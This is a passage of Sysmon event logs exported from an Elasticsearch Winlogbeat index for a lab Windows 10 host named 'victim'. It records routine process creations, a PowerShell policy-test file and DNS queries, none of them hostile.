UtcTime: 2022-10-22 17:49:53.808
ProcessGuid: {461f0bd2-2d41-6354-6300-000000001f00}
ProcessId: 5744
Image: C:\Windows\System32\wlrmdr.exe
FileVersion: 10.0.19041.746 (WinBuild.160101.0800)
Description: Windows logon reminder
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: WLRMNDR.EXE
CommandLine:  -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty
CurrentDirectory: C:\Windows\system32\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EF9BBA7A637A11B224A90BF90A8943AC,SHA256=2FDA95AAFB2E9284C730BF912B93F60A75B151941ADC14445ED1E056140325B1,IMPHASH=0C029EF03BE0DFE4324558843609A28E
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 588
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","-c, -s, 0, -f, 0, -t, Empty, -m, Empty, -a, 0, -u, Empty",13," -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty"," -c -s 0 -f 0 -t Empty -m Empty -a 0 -u Empty","{461f0bd2-2d41-6354-6300-000000001f00}","C:\Windows\System32\wlrmdr.exe","C:\Windows\System32\wlrmdr.exe",ef9bba7a637a11b224a90bf90a8943ac,2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1,"wlrmdr.exe","wlrmdr.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",588,"Microsoft Corporation","Windows logon reminder","10.0.19041.746 (WinBuild.160101.0800)",0c029ef03be0dfe4324558843609a28e,"WLRMNDR.EXE","Microsoft® Windows® Operating System",5744,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","2fda95aafb2e9284c730bf912b93f60a75b151941adc14445ed1e056140325b1, ef9bba7a637a11b224a90bf90a8943ac, 0c029ef03be0dfe4324558843609a28e","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Windows logon reminder","-","10.0.19041.746 (WinBuild.160101.0800)",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5104,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:53.255",PUXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","File created (rule: FileCreate)",file,11,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.630",event,sysmon,"-","Microsoft-Windows-Sysmon","-",creation,"C:\Users\Patricia Goh\AppData\Local\Temp",ps1,"__PSScriptPolicyTest_c0izitp4.nbb.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_c0izitp4.nbb.ps1","C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_c0izitp4.nbb.ps1","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"File created:
RuleName: -
UtcTime: 2022-10-22 17:49:53.255
ProcessGuid: {461f0bd2-2d36-6354-5a00-000000001f00}
ProcessId: 2332
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\Patricia Goh\AppData\Local\Temp\__PSScriptPolicyTest_c0izitp4.nbb.ps1
CreationUtcTime: 2022-10-22 17:49:53.255
User: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-2d36-6354-5a00-000000001f00}","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","-","-","powershell.exe","powershell.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",2332,"-","-","-","-","-","-","-","-","-","-","-","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","2022-10-22 17:49:53.255","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",11,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5103,"File created (rule: FileCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,2
"Oct 23, 2022 @ 01:49:52.777",PEXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.630",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:52.777
ProcessGuid: {461f0bd2-2d40-6354-6200-000000001f00}
ProcessId: 5696
Image: C:\Windows\System32\taskhostw.exe
FileVersion: 10.0.19041.1865 (WinBuild.160101.0800)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhostw.exe
CommandLine: taskhostw.exe SyncFromCloud
CurrentDirectory: C:\Windows\system32\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=A00BF82660835224CD6606A248321C5D,SHA256=E63709209D09BC0247E785F075DDB28A98C348206109E2B8BA321AD958402728,IMPHASH=3A0C6863CDE566AF997DB2DEFFF9D924
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 432
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","taskhostw.exe, SyncFromCloud",2,"taskhostw.exe SyncFromCloud","taskhostw.exe SyncFromCloud","{461f0bd2-2d40-6354-6200-000000001f00}","C:\Windows\System32\taskhostw.exe","C:\Windows\System32\taskhostw.exe",a00bf82660835224cd6606a248321c5d,e63709209d09bc0247e785f075ddb28a98c348206109e2b8ba321ad958402728,"taskhostw.exe","taskhostw.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",432,"Microsoft Corporation","Host Process for Windows Tasks","10.0.19041.1865 (WinBuild.160101.0800)",3a0c6863cde566af997db2defff9d924,"taskhostw.exe","Microsoft® Windows® Operating System",5696,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","e63709209d09bc0247e785f075ddb28a98c348206109e2b8ba321ad958402728, a00bf82660835224cd6606a248321c5d, 3a0c6863cde566af997db2defff9d924","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","Host Process for Windows Tasks","-","10.0.19041.1865 (WinBuild.160101.0800)",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","-","-","Microsoft® Windows® Operating System","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5102,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:52.257",skXQAIQBHC0TB3lJ9phU,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.396",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:52.257
ProcessGuid: {461f0bd2-2d40-6354-c100-000000001e00}
ProcessId: 1520
Image: C:\Program Files\winlogbeat\winlogbeat.exe
FileVersion: 8.2.3
Description: Winlogbeat ships Windows event logs to Elasticsearch or Logstash.
Product: Winlogbeat
Company: Elastic
OriginalFileName: winlogbeat.exe
CommandLine: ""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {461f0bd2-1c1d-6354-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=877E3C54A32856E349E3487DE69B963E,SHA256=C48B2B8A42E42B4C5D864389DB44CE0227821BEEBAF527C2E1947AD395D607D2,IMPHASH=FF9F3A86709796C17211F9DF12AAE74D
ParentProcessGuid: {00000000-0000-0000-0000-000000000000}
ParentProcessId: 660
ParentImage: -
ParentCommandLine: -
ParentUser: -","-","-","-","-","-","-","-","-","-","-","-","-","C:\Program Files\winlogbeat\winlogbeat.exe, --environment=windows_service, -c, C:\Program Files\winlogbeat\winlogbeat.yml, --path.home, C:\Program Files\winlogbeat, --path.data, C:\ProgramData\winlogbeat, --path.logs, C:\ProgramData\winlogbeat\logs, -E, logging.files.redirect_stderr=true",12,"""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true","""C:\Program Files\winlogbeat\winlogbeat.exe"" --environment=windows_service -c ""C:\Program Files\winlogbeat\winlogbeat.yml"" --path.home ""C:\Program Files\winlogbeat"" --path.data ""C:\ProgramData\winlogbeat"" --path.logs ""C:\ProgramData\winlogbeat\logs"" -E logging.files.redirect_stderr=true","{461f0bd2-2d40-6354-c100-000000001e00}","C:\Program Files\winlogbeat\winlogbeat.exe","C:\Program Files\winlogbeat\winlogbeat.exe",877e3c54a32856e349e3487de69b963e,c48b2b8a42e42b4c5d864389db44ce0227821beebaf527c2e1947ad395d607d2,"winlogbeat.exe","winlogbeat.exe","-",1,"-","-","{00000000-0000-0000-0000-000000000000}","-","-","-","-",660,Elastic,"Winlogbeat ships Windows event logs to Elasticsearch or Logstash.","8.2.3",ff9f3a86709796c17211f9df12aae74d,"winlogbeat.exe",Winlogbeat,1520,"-","-","C:\Windows\system32\","C:\Windows\system32\","-","-","-","-","-","-","c48b2b8a42e42b4c5d864389db44ce0227821beebaf527c2e1947ad395d607d2, 877e3c54a32856e349e3487de69b963e, ff9f3a86709796c17211f9df12aae74d","-","-",SYSTEM,"-","-","NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,Elastic,"-","Winlogbeat ships Windows event logs to Elasticsearch or Logstash.","-","8.2.3",System,"{461f0bd2-1c1d-6354-e703-000000000000}",0x3e7,"-","-","-",Winlogbeat,"-","-","-","-","-","-","-","-",0,"-",1,"-","-",Info,"2,276","2,512","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4924,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:51.919",uEXQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","185.199.110.133, 185.199.111.133, 185.199.108.133, 185.199.109.133","A, A, A, A","raw.githubusercontent.com","raw.githubusercontent.com","-","githubusercontent.com","185.199.110.133, 185.199.111.133, 185.199.108.133, 185.199.109.133","1.12.0","Dns query (rule: DnsQuery)",network,22,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.417",event,sysmon,"-","Microsoft-Windows-Sysmon","-","connection, protocol, info","-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Dns query:
RuleName: -
UtcTime: 2022-10-22 17:49:51.919
ProcessGuid: {461f0bd2-1c1e-6354-1300-000000001e00}
ProcessId: 512
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.109.133;
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\SYSTEM",dns,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-1c1e-6354-1300-000000001e00}","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe","-","-","svchost.exe","svchost.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",512,"-","-","-","-","-","-","-","-","-","-","-","raw.githubusercontent.com","185.199.110.133, 185.199.111.133, 185.199.108.133, 185.199.109.133",SYSTEM,"-",SUCCESS,"NT AUTHORITY","-","S-1-5-18",SYSTEM,SYSTEM,"-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",22,"-","-",Info,"2,276","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4930,"Dns query (rule: DnsQuery)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:49.894",tEXQAIQBHC0TB3lJ9php,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","c2c04a29-9d47-4de5-86f6-5958b0d4222c",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","NT AUTHORITY","-","-","-","-","1.12.0","Dns query (rule: DnsQuery)",network,22,"Oct 23, 2022 @ 01:50:09.614","Oct 23, 2022 @ 01:50:05.414",event,sysmon,"-","Microsoft-Windows-Sysmon","-","connection, protocol, info","-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Dns query:
RuleName: -
UtcTime: 2022-10-22 17:49:49.894
ProcessGuid: {461f0bd2-1c1f-6354-1900-000000001e00}
ProcessId: 1372
QueryName: NT AUTHORITY
QueryStatus: 9560
QueryResults: -
Image: C:\Windows\System32\svchost.exe
User: NT AUTHORITY\NETWORK SERVICE",dns,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","{461f0bd2-1c1f-6354-1900-000000001e00}","C:\Windows\System32\svchost.exe","C:\Windows\System32\svchost.exe","-","-","svchost.exe","svchost.exe","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",1372,"-","-","-","-","-","-","-","-","-","-","-","NT AUTHORITY","-","NETWORK SERVICE","-","DNS_ERROR_INVALID_NAME_CHAR","NT AUTHORITY","-","S-1-5-18","NETWORK SERVICE","NETWORK SERVICE","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-",22,"-","-",Info,"2,276","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",4926,"Dns query (rule: DnsQuery)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
"Oct 23, 2022 @ 01:49:46.394",OEXTAIQBHC0TB3lJ2ZqO,".ds-winlogbeat-8.2.3-2022.10.22-000001","-","25051d08-9df1-4629-b2c6-d1eeb5aa9cfd",victim,"b15c43c7-63a1-423e-901b-f1acc6401711",victim,winlogbeat,"8.2.3","-","-","-","-","-","-","-","1.12.0","Process Create (rule: ProcessCreate)",process,1,"Oct 23, 2022 @ 01:50:36.207","Oct 23, 2022 @ 01:53:14.628",event,sysmon,"-","Microsoft-Windows-Sysmon","-",start,"-","-","-","-","-","x86_64",victim,"461f0bd2-c182-413a-8a41-2a8e4accb4a9","fe80::4959:93ba:69a6:522d, 10.0.2.15, fe80::91a8:3d9e:36ba:f548, 172.19.96.10","08:00:27:7c:f3:ae, 08:00:27:22:f7:3c",victim,"19044.1889",windows,"10.0.19041.1889 (WinBuild.160101.0800)","Windows 10 Enterprise Evaluation","Windows 10 Enterprise Evaluation",windows,windows,"10.0",information,"Process Create:
RuleName: -
UtcTime: 2022-10-22 17:49:46.394
ProcessGuid: {461f0bd2-2d3a-6354-5f00-000000001f00}
ProcessId: 5376
Image: C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe
FileVersion: 106.0.1370.52
Description: PWA Identity Proxy Host
Product: Microsoft Edge
Company: Microsoft Corporation
OriginalFileName: identity_helper.exe
CommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=3080 --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072 /prefetch:8
CurrentDirectory: C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\
User: VICTIM\Patricia Goh
LogonGuid: {461f0bd2-2d0d-6354-ef2b-030000000000}
LogonId: 0x32BEF
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=ECADD6642E49FEAC3F3B038F5A2C6432,SHA256=B32DAEF4F46AC58D95D1CC5D1201D6890991908D6889A85ECC7DBECDD18D3D96,IMPHASH=B9B1C3D57C07EFF51318AFD5131CBD82
ParentProcessGuid: {461f0bd2-2d33-6354-5300-000000001f00}
ParentProcessId: 1004
ParentImage: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
ParentCommandLine: ""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start /prefetch:5
ParentUser: VICTIM\Patricia Goh","-","-","-","-","-","-","-","-","-","-","-","-","C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe, --type=utility, --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService, --lang=en-US, --service-sandbox-type=none, --mojo-platform-channel-handle=3080, --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072, /prefetch:8",8,"""C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=3080 --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072 /prefetch:8","""C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe"" --type=utility --utility-sub-type=winrt_app_id.mojom.WinrtAppIdService --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=3080 --field-trial-handle=2096,i,12931208589142636227,13865709978780780176,131072 /prefetch:8","{461f0bd2-2d3a-6354-5f00-000000001f00}","C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe","C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\identity_helper.exe",ecadd6642e49feac3f3b038f5a2c6432,b32daef4f46ac58d95d1cc5d1201d6890991908d6889a85ecc7dbecdd18d3d96,"identity_helper.exe","identity_helper.exe","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe, --no-startup-window, --win-session-start, /prefetch:5",4,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start /prefetch:5","""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window --win-session-start /prefetch:5","{461f0bd2-2d33-6354-5300-000000001f00}","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe","msedge.exe","msedge.exe",1004,"Microsoft Corporation","PWA Identity Proxy Host","106.0.1370.52",b9b1c3d57c07eff51318afd5131cbd82,"identity_helper.exe","Microsoft Edge",5376,"-","-","C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\","C:\Program Files (x86)\Microsoft\Edge\Application\106.0.1370.52\","-","-","-","-","-","-","b32daef4f46ac58d95d1cc5d1201d6890991908d6889a85ecc7dbecdd18d3d96, ecadd6642e49feac3f3b038f5a2c6432, b9b1c3d57c07eff51318afd5131cbd82","-","-","Patricia Goh","-","-",VICTIM,"-","S-1-5-18","Patricia Goh","Patricia Goh","-",wineventlog,"Microsoft-Windows-Sysmon/Operational",victim,"Microsoft Corporation","-","PWA Identity Proxy Host","-","106.0.1370.52",High,"{461f0bd2-2d0d-6354-ef2b-030000000000}",0x32bef,"-","VICTIM\Patricia Goh","-","Microsoft Edge","-","-","-","-","-","-","-","-",1,"-",1,"-","-",Info,"2,240","2,984","{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","Microsoft-Windows-Sysmon",5098,"Process Create (rule: ProcessCreate)","NT AUTHORITY","S-1-5-18",SYSTEM,User,5
